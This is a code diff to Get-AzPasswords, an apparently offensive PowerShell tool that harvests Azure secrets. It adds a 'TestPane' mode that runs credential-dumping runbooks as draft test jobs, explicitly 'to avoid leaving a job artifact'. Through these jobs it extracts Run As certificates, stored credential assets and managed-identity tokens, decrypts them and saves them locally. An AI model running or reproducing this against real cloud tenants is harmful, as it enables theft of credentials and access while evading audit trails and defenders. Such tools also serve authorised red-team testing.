@@ -111,7 +111,12 @@ Function Get-AzPasswords
         [Parameter(Mandatory=$false,
         HelpMessage="Export the Key Vault certificates to local files.")]
         [ValidateSet("Y","N")]
-        [string]$ExportCerts = "N"
+        [string]$ExportCerts = "N",
+        
+        [Parameter(Mandatory=$false,
+        HelpMessage="Run any Automation Account runbooks via the test pane to avoid leaving a job artifact")]
+        [ValidateSet("Y","N")]
+        [string]$TestPane = "N"
 
     )
 
@@ -647,37 +652,59 @@ Function Get-AzPasswords
                     try{
                         Import-AzAutomationRunbook -Path $pwd\$jobName.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobName | Out-Null
 
-                        # Publish the runbook
-                        Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobName | Out-Null
+                        try{
+                            if($TestPane -eq "Y"){
+                                #For test pane execution we need to avoid the call to Publish-AzAutomationRunbook since the runbook needs to be a draft
+                                $mgmtToken = (Get-AzAccessToken).Token
+                                #Hit the /draft/testJob endpoint directly to create the job, poll for it to finish, and get the output
+                                $createJob = (Invoke-WebRequest -Verbose:$false -Method PUT -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobName,"/draft/testJob?api-version=2015-10-31")) -Headers @{Authorization="Bearer $mgmtToken"} -ContentType application/json -Body "{'runOn':''}").Content | ConvertFrom-Json
+                                $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobName,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
+                                while($jobStatus.Status -ne "Completed"){
+                                    $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobName,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
+                                }
+                                $jobOutput = ((Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobName,"/draft/testJob/streams?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json).Value
+                                $jobSummary = $jobOutput.properties.summary
+                                $FileName = Join-Path $pwd $runAsName"-AzureRunAsCertificate.pfx"
+                                [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String(($jobSummary | Unprotect-CmsMessage -IncludeContext)))
+                                $instructionsMSG = "`t`t`tRun AuthenticateAs-$runAsName.ps1 (as a local admin) to import the cert and login as the Automation Connection account"
+                                Write-Verbose $instructionsMSG
+                            }
+                            else{
+                                # Publish the runbook
+                                Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobName | Out-Null
 
-                        # Run the runbook and get the job id
-                        $jobID = Start-AzAutomationRunbook -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
+                                # Run the runbook and get the job id
+                                $jobID = Start-AzAutomationRunbook -Name $jobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
 
-                        $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                                $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
 
-                        # Wait for the job to complete
-                        Write-Verbose "`t`tWaiting for the automation job to complete"
-                        while($jobstatus.Status -ne "Completed"){
-                            $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
-                        }    
-
-                        $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
+                                # Wait for the job to complete
+                                Write-Verbose "`t`tWaiting for the automation job to complete"
+                                while($jobstatus.Status -ne "Completed"){
+                                    $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                                }    
+    
+                                $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
                           
-                        # if execution errors, delete the AuthenticateAs- ps1 file
-                        if($jobOutput.Exception){
-                            Write-Verbose "`t`tNo available certificate for the connection"
-                            Remove-Item -Path (Join-Path $pwd "AuthenticateAs-$runAsName.ps1") | Out-Null                            
-                        }
-                        # Else write it to a local file
-                        else{
+                                # if execution errors, delete the AuthenticateAs- ps1 file
+                                if($jobOutput.Exception){
+                                    Write-Verbose "`t`tNo available certificate for the connection"
+                                    Remove-Item -Path (Join-Path $pwd "AuthenticateAs-$runAsName.ps1") | Out-Null                            
+                                }
+                                # Else write it to a local file
+                                else{
 
-                            $FileName = Join-Path $pwd $runAsName"-AzureRunAsCertificate.pfx"
-                            # Decrypt the output and write the pfx file
-                            [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String(($jobOutput.Values | Unprotect-CmsMessage)))
+                                    $FileName = Join-Path $pwd $runAsName"-AzureRunAsCertificate.pfx"
+                                    # Decrypt the output and write the pfx file
+                                    [IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String(($jobOutput.Values | Unprotect-CmsMessage)))
 
-                            $instructionsMSG = "`t`t`tRun AuthenticateAs-$runAsName.ps1 (as a local admin) to import the cert and login as the Automation Connection account"
-                            Write-Verbose $instructionsMSG                        
+                                    $instructionsMSG = "`t`t`tRun AuthenticateAs-$runAsName.ps1 (as a local admin) to import the cert and login as the Automation Connection account"
+                                    Write-Verbose $instructionsMSG                        
+                                }
+                            }
+                            
                         }
+                        catch{}
 
                         # clean up
                         Write-Verbose "`t`tRemoving $jobName runbook from $verboseName Automation Account"
@@ -709,41 +736,59 @@ Function Get-AzPasswords
                         try{
                             Import-AzAutomationRunbook -Path $pwd\$jobToRun.ps1 -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $jobToRun | Out-Null
 
-                            # publish the runbook
-                            Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobToRun | Out-Null
-
-                            # run the runbook and get the job id
-                            $jobID = Start-AzAutomationRunbook -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
-
-                            $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
-
-                            # Wait for the job to complete
-                            Write-Verbose "`t`t`tWaiting for the automation job to complete"
-                            while($jobstatus.Status -ne "Completed"){
-                                $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
-                            }    
-
-                            # If there was an actual cred here, get the output and add it to the table                    
                             try{
-                                # Get the output
-                                $jobOutput = (Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value)
-                                
-                                # Might be able to delete this line...
-                                if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
-        
-                                # Decrypt the output and add it to the table
-                                $cred1 = ($jobOutput[0].value | Unprotect-CmsMessage)
-                                $cred2 = ($jobOutput[1].value | Unprotect-CmsMessage)
-                                $TempTblCreds.Rows.Add("Azure Automation Account",$AutoAccount.AutomationAccountName,$cred1,$cred2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
-                            }
-                            catch {}
+                                if($TestPane -eq "Y"){
+                                    $mgmtToken = (Get-AzAccessToken).Token
+                                    $createJob = (Invoke-WebRequest -Verbose:$false -Method PUT -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobToRun,"/draft/testJob?api-version=2015-10-31")) -Headers @{Authorization="Bearer $mgmtToken"} -ContentType application/json -Body "{'runOn':''}").Content | ConvertFrom-Json
+                                    $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobToRun,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
+                                    while($jobStatus.Status -ne "Completed"){
+                                        $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobToRun,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
+                                    }
+                                    $jobOutput = ((Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $jobToRun,"/draft/testJob/streams?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json).Value
+                                    $jobSummary = $jobOutput.properties.summary
+                                    $cred1 = ($jobSummary.Item(0) | Unprotect-CmsMessage)
+                                    $cred2 = ($jobSummary.Item(1) | Unprotect-CmsMessage)
+                                    $TempTblCreds.Rows.Add("Azure Automation Account",$AutoAccount.AutomationAccountName,$cred1,$cred2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
+                                }
+                                else{
+                                     # publish the runbook
+                                    Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $jobToRun | Out-Null
 
-                            # clean up
+                                    # run the runbook and get the job id
+                                    $jobID = Start-AzAutomationRunbook -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
+
+                                    $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+
+                                    # Wait for the job to complete
+                                    Write-Verbose "`t`t`tWaiting for the automation job to complete"
+                                    while($jobstatus.Status -ne "Completed"){
+                                        $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                                    }    
+    
+                                    # If there was an actual cred here, get the output and add it to the table                    
+                                    try{
+                                        # Get the output
+                                        $jobOutput = (Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value)
+                                
+                                        # Might be able to delete this line...
+                                        if($jobOutput[0] -like "Credentials asset not found*"){$jobOutput[0] = "Not Created"; $jobOutput[1] = "Not Created"}
+        
+                                        # Decrypt the output and add it to the table
+                                        $cred1 = ($jobOutput[0].value | Unprotect-CmsMessage)
+                                        $cred2 = ($jobOutput[1].value | Unprotect-CmsMessage)
+                                        $TempTblCreds.Rows.Add("Azure Automation Account",$AutoAccount.AutomationAccountName,$cred1,$cred2,"N/A","N/A","N/A","N/A","Password","N/A",$subName) | Out-Null
+                                    }
+                                    catch {}
+                                }
+                                
+                            }
+                            catch{}
                             Write-Verbose "`t`t`tRemoving $jobToRun runbook from $verboseName Automation Account"
                             Remove-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -Name $jobToRun -ResourceGroupName $AutoAccount.ResourceGroupName -Force
 
                         }
-                        Catch{Write-Verbose "`tUser does not have permissions to import Runbook"}
+                        Catch{
+                        Write-Verbose "`tUser does not have permissions to import Runbook"}
 
                         # Clean up local temp files
                         Remove-Item -Path $pwd\$jobToRun.ps1 | Out-Null
@@ -756,21 +801,42 @@ Function Get-AzPasswords
                 Write-Verbose "`tGetting a token for the $verboseName Automation Account using the $dumpMiJobName.ps1 runbook"
                 try{
                     Import-AzAutomationRunbook -Path ".\$dumpMiJobName.ps1" -ResourceGroup $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Type PowerShell -Name $dumpMiJobName | Out-Null
-                    Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $dumpMiJobName | Out-Null
-    
-                    $jobID = Start-AzAutomationRunbook -Name $dumpMiJobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
-                    $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
-                    # Wait for the job to complete
-                    Write-Verbose "`t`tWaiting for the automation job to complete"
-                    while($jobstatus.Status -ne "Completed"){
-                        $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
-                    }    
+                    
                     try{
-                        $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
-                        Write-Verbose "`t`t`tRetrieved system assigned identity token for the $verboseName account"
-                        $tokenDecrypted = $jobOutput.Values | Unprotect-CmsMessage
-                        # Add creds to the table
-                        $TempTblCreds.Rows.Add("Automation Account System Assigned Managed Identity",$AutoAccount.AutomationAccountName,"N/A",$tokenDecrypted,"N/A","N/A","N/A","N/A","Token","N/A",$subName) | Out-Null
+                        if($TestPane -eq "Y"){
+                            $mgmtToken = (Get-AzAccessToken).Token
+                            $createJob = (Invoke-WebRequest -Verbose:$false -Method PUT -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $dumpMiJobName,"/draft/testJob?api-version=2015-10-31")) -Headers @{Authorization="Bearer $mgmtToken"} -ContentType application/json -Body "{'runOn':''}").Content | ConvertFrom-Json
+                            $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $dumpMiJobName,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
+                            while($jobStatus.Status -ne "Completed"){
+                                $jobStatus = (Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $dumpMiJobName,"/draft/testJob?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json
+                            }
+                            $jobOutput = ((Invoke-WebRequest -Verbose:$false -Uri (-join ("https://management.azure.com/subscriptions/", $AutoAccount.SubscriptionId, "/resourceGroups/", $AutoAccount.ResourceGroupName, "/providers/Microsoft.Automation/automationAccounts/", $AutoAccount.AutomationAccountName, "/runbooks/", $dumpMiJobName,"/draft/testJob/streams?api-version=2019-06-01")) -Headers @{Authorization="Bearer $mgmtToken"}).Content | ConvertFrom-Json).Value
+                            $jobSummary = $jobOutput.properties.summary
+                            Write-Verbose "`t`t`tRetrieved system assigned identity token for the $verboseName account"
+                            $tokenDecrypted = $jobSummary | Unprotect-CmsMessage
+                            # Add creds to the table
+                            $TempTblCreds.Rows.Add("Automation Account System Assigned Managed Identity",$AutoAccount.AutomationAccountName,"N/A",$tokenDecrypted,"N/A","N/A","N/A","N/A","Token","N/A",$subName) | Out-Null
+                        }
+                        else{
+                            Publish-AzAutomationRunbook -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroup $AutoAccount.ResourceGroupName -Name $dumpMiJobName | Out-Null
+    
+                            $jobID = Start-AzAutomationRunbook -Name $dumpMiJobName -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName | select JobId
+                            $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                            # Wait for the job to complete
+                            Write-Verbose "`t`tWaiting for the automation job to complete"
+                            while($jobstatus.Status -ne "Completed"){
+                            $jobstatus = Get-AzAutomationJob -AutomationAccountName $AutoAccount.AutomationAccountName -ResourceGroupName $AutoAccount.ResourceGroupName -Id $jobID.JobId | select Status
+                            }    
+                            try{
+                                $jobOutput = Get-AzAutomationJobOutput -ResourceGroupName $AutoAccount.ResourceGroupName -AutomationAccountName $AutoAccount.AutomationAccountName -Id $jobID.JobId | Get-AzAutomationJobOutputRecord | Select-Object -ExpandProperty Value
+                                Write-Verbose "`t`t`tRetrieved system assigned identity token for the $verboseName account"
+                                $tokenDecrypted = $jobOutput.Values | Unprotect-CmsMessage
+                                # Add creds to the table
+                                $TempTblCreds.Rows.Add("Automation Account System Assigned Managed Identity",$AutoAccount.AutomationAccountName,"N/A",$tokenDecrypted,"N/A","N/A","N/A","N/A","Token","N/A",$subName) | Out-Null
+                            }
+                            catch{}
+                        }
+                        
                     }
                     catch{}
 
